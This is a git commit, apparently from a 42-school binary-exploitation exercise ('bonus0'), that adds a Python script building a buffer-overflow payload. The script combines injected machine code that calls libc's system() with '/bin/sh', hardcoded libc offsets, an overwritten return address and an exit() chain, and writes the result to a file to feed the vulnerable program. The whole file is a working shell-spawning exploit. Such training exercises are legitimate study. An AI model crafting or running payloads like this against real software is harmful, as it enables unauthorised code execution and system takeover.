9b8dfd8b5fafc7d0daf87fa61ecd9f12bb95937b
ppajot <ppajot@student.42.fr>
2023-12-20 02:38:35 +0100

    bonus0 current payload

---
+++ bonus0/craft_payload.py
@@ -0,0 +1,31 @@
+import struct
+
+# Assume these values are found through your analysis
+buffer_size = 20
+buffer_followup_offset = 9
+libc_base_addr = 0xb7e2c000
+exit_offset = 0x32be0
+system_offset = 0x0003f060 
+bin_sh_offset = 0x160c58
+main_ret_offset = 0x0804854b
+shellcode_address =  0xbffff5e6
+
+# Create the payload
+payload = b"\xC7\x04\x24"  # mov_dword
+payload += struct.pack("<I", libc_base_addr + bin_sh_offset)
+payload += b"\xe8"          # call
+payload += struct.pack("<i", libc_base_addr + system_offset - (shellcode_address + 12)) # current address for relative call
+payload += b"a" * 8
+payload += b"\x0a"
+payload += b"\x00" * (0x1000 - 21)
+payload += b"a" * 5
+payload += struct.pack("<I", shellcode_address)
+payload += struct.pack("<I", shellcode_address)
+payload += struct.pack("<I", libc_base_addr + exit_offset)
+payload += b"a" * 3
+payload += b"\x0a\x00"
+
+
+# Save the payload to a file or pass it directly to the vulnerable program
+with open('payload', 'wb') as f:
+    f.write(payload)
